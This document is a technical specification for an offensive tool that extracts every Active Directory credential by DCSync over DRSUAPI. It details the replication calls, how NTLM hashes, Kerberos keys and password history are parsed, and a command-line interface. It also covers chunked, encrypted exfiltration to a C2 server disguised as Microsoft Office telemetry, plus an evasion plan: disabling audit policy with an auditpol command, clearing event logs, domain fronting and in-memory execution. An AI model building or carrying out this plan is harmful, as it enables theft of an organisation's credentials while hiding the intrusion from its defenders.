# Plan 3 — DCSync via DRSUAPI: Technical Specification

> **Target**: T1003.006 — DCSync  
> **Pre-condition**: Domain Admin or Replicate Directory Changes privilege (assumed)  
> **Scope**: DRS replication + exfiltration — no AD CS/PE chain

---

## 1. Overview

Full domain credential extraction via DRSUAPI (`DsGetNCChanges`), simulating legitimate Domain Controller replication. Credentials are extracted in-memory, chunked, encrypted, and exfiltrated over HTTPS mimicking Microsoft Office telemetry traffic.

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌────────────┐
│ Authenticate │    │ DRSUAPI       │    │ Parse         │    │ Chunked    │
│ as DA /      │───▶│ DsGetNC       │───▶│ Credentials   │───▶│ HTTPS C2   │
│ Repl. Priv.  │    │ Changes()     │    │               │    │ Exfil      │
└──────────────┘    └──────────────┘    └──────────────┘    └────────────┘
```

---

## 2. Functional Requirements

### FR-1: Authentication & Connection
| ID | Requirement |
|----|-------------|
| FR-1.1 | Authenticate to target DC using existing credentials (DA or Repl. privs) |
| FR-1.2 | Bind to DRSUAPI RPC interface via `MS-DRSR` protocol |
| FR-1.3 | Support both: local DC (SYSTEM on DC) and remote DC (DA credentials) |

### FR-2: DCSync Replication
| ID | Requirement |
|----|-------------|
| FR-2.1 | Call `DsGetNCChanges()` with domain NC (Naming Context DN) |
| FR-2.2 | Request flags: `DRS_GET_ANC` \| `DRS_GET_NC_SIZE` \| `DRS_GET_OBJECT_SECURITY` |
| FR-2.3 | Process replication cursor from previous sync (or NULL for first request) |
| FR-2.4 | Handle incremental replication (cursor tracking for subsequent pulls) |
| FR-2.5 | Parse ENTINFs from replication response |
| FR-2.6 | Extract `unicodePwd` → NTLM hash |
| FR-2.7 | Extract `supplementalCredentials` → Kerberos keys (AES256, AES128, DES) + WDigest |
| FR-2.8 | Extract `pwdHistory` → password history (crackable) |
| FR-2.9 | Extract `userPrincipalName`, `sAMAccountName`, `objectSid` for each user |
| FR-2.10 | Handle replicated objects: users, computers, Trust accounts |

### FR-3: Credential Parsing
| ID | Requirement |
|----|-------------|
| FR-3.1 | Decode `unicodePwd` → raw 16-byte NTLM hash (reversible, not hashed again) |
| FR-3.2 | Parse `supplementalCredentials` (KERB_STORED_CREDENTIAL) → extract each key |
| FR-3.3 | Identify key types: AES256-CTS-HMAC-SHA1-96 (etype 18), AES128 (etype 17), DES (etype 1) |
| FR-3.4 | Parse WDigest credentials from supplementalCredentials if present |
| FR-3.5 | Parse `pwdHistory` → array of previous NTLM hashes |
| FR-3.6 | Handle empty/missing attributes gracefully |

### FR-4: Data Preparation
| ID | Requirement |
|----|-------------|
| FR-4.1 | Structure output: per-user format (RID, name, UPN, NTLM, AES256, AES128, history) |
| FR-4.2 | Count total users, computers, trust accounts |
| FR-4.3 | Calculate data size and chunk count |

### FR-5: Exfiltration
| ID | Requirement |
|----|-------------|
| FR-5.1 | Chunk data: max 4KB per chunk |
| FR-5.2 | Encrypt each chunk: generate AES-256-GCM session key + encrypt with C2 server RSA-4096 public key |
| FR-5.3 | Send via HTTPS POST to C2 server |
| FR-5.4 | HTTP headers mimic Microsoft Office telemetry: User-Agent, Content-Type, MS-ASG |
| FR-5.5 | Jitter between chunks: 500ms–3000ms random |
| FR-5.6 | Support domain fronting (Azure CDN, Cloudflare Workers) |

### FR-6: Stealth
| ID | Requirement |
|----|-------------|
| FR-6.1 | Disable Directory Service Access audit policy before DCSync (if SYSTEM on DC) |
| FR-6.2 | Operate entirely in-memory (reflective DLL, no file on disk) |
| FR-6.3 | Execute during business hours (blend with legitimate replication traffic) |
| FR-6.4 | Self-cleanup: re-enable audit policy, clear any event logs generated |

---

## 3. Protocol Details

### 3.1 DRSUAPI — DsGetNCChanges

```
MS-DRSR: Directory Replication Service (DRS) Remote Protocol

RPC Interface: E3514235-4B06-11D1-AB04-00C04FC2DCD2
Named Pipe:    \PIPE\lsass (Local DC) or \PIPE\protected_storage (Remote DC)

DsGetNCChanges(
    [in]           handle_t       hDrs,         // DRS binding handle
    [in]           DWORD          dwInVersion,  // always 1
    [in, ref]      DRS_MSG_GETCHGREQ* pmsgIn,   // request
    [out, ref]     DWORD*         pdwOutVersion,
    [out, ref]     DRS_MSG_GETCHGREPLY* pmsgOut // response
);

Request structure:
  pmsgIn->V1.pNC:                Domain NC DN (e.g., DC=domain,DC=local)
  pmsgIn->V1.ulFlags:            DRS_GET_ANC | DRS_GET_NC_SIZE
  pmsgIn->V1.cMaxObjects:        0 (unlimited)
  pmsgIn->V1.cMaxBytes:          0 (unlimited)
  pmsgIn->V1.pUpToDateVecDest:   NULL (first request) or previous cursor

Response:
  pmsgOut->V1.pNC:               Replicated NC
  pmsgOut->V1.ulMoreFlags:       DRS_MORE_DATA if more objects
  pmsgOut->V1.cNumObjects:       Number of objects in this response
  pmsgOut->V1.pObjects:          Array of ENTINFs
  pmsgOut->V1.pUpToDateVecDestV1: Updated replication cursor
```

### 3.2 ENTINF — Entity Information

```
Each ENTINF contains:
  pName:             Distinguished Name of the AD object
  ulFlags:           ENTINF flags
  AttrBlock:         Attribute block
    ├─ pAttr:        Array of ATTRVAL
    │   ├─ attrTyp:  Attribute OID (e.g., unicodePwd = 2.5.5.1)
    │   └─ AttrVal:  Array of ATTRVAL
    │       ├─ valLen:   Length
    │       └─ pVal:     Value (binary)

Key attribute OIDs:
  unicodePwd:               1.3.6.1.4.1.311.3.1.1.1
  supplementalCredentials:  1.3.6.1.4.1.311.3.1.1.3
  pwdHistory:               1.3.6.1.4.1.311.3.1.1.2
  userPrincipalName:        1.2.840.113556.1.4.656
  sAMAccountName:           1.2.840.113556.1.4.221
  objectSid:                1.2.840.113556.1.4.146
```

### 3.3 supplementalCredentials Decoding

```
KERB_STORED_CREDENTIAL structure:
  [0x00] USHORT Revision
  [0x02] USHORT Flags
  [0x04] USHORT CredentialCount
  [0x06] USHORT OldCredentialCount
  [0x08] USHORT DefaultSaltLength
  [0x0A] USHORT DefaultSaltMaximumLength
  [0x0C] ULONG  DefaultSaltOffset
  [0x10] ...    Credentials[CredentialCount]

Each KERB_KEY_DATA:
  [0x00] USHORT Reserved1
  [0x02] USHORT Reserved2
  [0x04] ULONG  Reserved3
  [0x08] ULONG  KeyType    // 18 = AES256, 17 = AES128, 1 = DES, 23 = RC4
  [0x0C] ULONG  KeyLength
  [0x10] ULONG  KeyOffset  // relative to this structure start
  // Key at KeyOffset, length KeyLength
```

---

## 4. Interface Definitions

### 4.1 Command Line

```
DCSyncTool.exe <command>

Commands:
  --dcsync <domain>         Full DCSync for domain (e.g., DOMAIN.LOCAL)
  --dcsync-local            DCSync from this DC (requires SYSTEM)
  --list-domains            Enumerate domains in forest
  --output-json             Output as JSON (instead of binary blob)
  --output-file <f>         Write encrypted output to file
  --output-c2 <url>         Exfiltrate to C2 server
  --max-objects <n>         Limit objects (for testing)
  --no-exfil                Parse only, do not exfiltrate (debug)

Options:
  --dc <hostname>           Target DC (default: auto-detect)
  --user <domain\user>      Username for remote DC (default: current)
  --pass <password>         Password (omit for current session)
  --chunk-size <n>          Chunk size in bytes (default: 4096)
  --jitter-min <ms>         Min jitter between chunks (default: 500)
  --jitter-max <ms>         Max jitter between chunks (default: 3000)
  --front-domain <fqdn>     Domain fronting hostname
```

### 4.2 Output Format

```json
{
  "version": 2,
  "domain": "DOMAIN.LOCAL",
  "domainSid": "S-1-5-21-XXXXXX",
  "dcName": "DC01.DOMAIN.LOCAL",
  "timestamp": "2026-08-03T15:30:00Z",
  "statistics": {
    "totalUsers": 1523,
    "totalComputers": 487,
    "totalTrusts": 2,
    "totalCreds": 2012
  },
  "users": [
    {
      "dn": "CN=Administrator,CN=Users,DC=domain,DC=local",
      "sAMAccountName": "Administrator",
      "userPrincipalName": "admin@domain.local",
      "objectSid": "S-1-5-21-XXXXXX-500",
      "rid": 500,
      "ntlmHash": "aad3b435b51404eeaad3b435b51404ee",
      "kerberosKeys": [
        {"type": 18, "key": "base64..."},
        {"type": 17, "key": "base64..."}
      ],
      "passwordHistory": [
        {"ntlm": "hash..."},
        {"ntlm": "hash..."}
      ],
      "enabled": true,
      "adminCount": true,
      "memberOf": ["CN=Domain Admins,CN=Users,...", "CN=Enterprise Admins,..."]
    }
  ],
  "computers": [
    {
      "dn": "CN=DC01,OU=Domain Controllers,...",
      "sAMAccountName": "DC01$",
      "ntlmHash": "...",
      "kerberosKeys": [...]
    }
  ]
}
```

### 4.3 C2 Exfil Format

```
Each chunk (up to 4KB):
POST /telemetry/v1/events HTTP/1.1
Host: telemetry-events.office-cdn.com
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; MSA 16.0.14326.xxxxx)
Content-Type: application/json
X-Client-Session-Id: {UUID}
MS-ASG: {random_base64}

{"seq":12,"total":487,"data":"base64_aes_gcm_encrypted_chunk"}

Response: HTTP 200 {"status":"ok"} (from C2 server)
```

---

## 5. Bypass Strategy

| # | EDR Layer | Detection | Bypass |
|---|-----------|-----------|--------|
| 1 | Event ID 4662 (DS Access) | DRS replication GUID in event | Disable audit policy before DCSync (`auditpol /set /subcategory:"Directory Service Access" /success:disable /failure:disable`) |
| 2 | SIEM correlation | Event 4662 from non-DC account | Run DCSync from DC itself (SYSTEM context) — DC accounts always replicate |
| 3 | Network traffic: DC→Internet | DC beaconing to unknown domain | Domain fronting (Azure CDN); traffic looks like Windows telemetry |
| 4 | Process creation on DC | New process on DC | Execute in-memory (Cobalt Strike execute-assembly or reflective DLL in existing process) |
| 5 | Volume anomaly | Large data transfer from DC | Chunking 4KB + jitter; spread over hours if needed |
| 6 | Kerberos TGT request (if AD CS) | Unusual service ticket request | Blend with normal auth traffic during business hours |

---

## 6. Test Cases

| TC | Scenario | Expected |
|----|----------|---------|
| TC-01 | DA on remote machine → DCSync domain.local | All domain creds extracted |
| TC-02 | SYSTEM on DC → DCSync domain.local | All domain creds extracted |
| TC-03 | Small domain (< 50 users) | Complete in < 60 seconds |
| TC-04 | Large domain (> 5000 users) | Multiple replication cycles, chunked exfil |
| TC-05 | Audit policy ENABLED → check if 4662 triggered | 4662 generated → SIEM may detect |
| TC-06 | Audit policy DISABLED → no events | No 4662 → blind spot |
| TC-07 | C2 exfil with jitter and chunking | No volume-based anomaly |
| TC-08 | Multi-domain forest | DCSync each domain separately |

---

## 7. Success Criteria

- [ ] DRSUAPI bind successful
- [ ] `DsGetNCChanges` returns all domain objects
- [ ] `unicodePwd` → NTLM hashes extracted for ALL users
- [ ] `supplementalCredentials` → Kerberos keys extracted for ALL users
- [ ] Password history extracted where present
- [ ] Computer account credentials extracted
- [ ] Trust account credentials extracted (if applicable)
- [ ] Exfiltration completed without network detection
- [ ] No Event 4662 if audit disabled; 4662 generated (but not alerted) if enabled
- [ ] Zero files written to disk on DC
- [ ] Audit policy restored post-operation
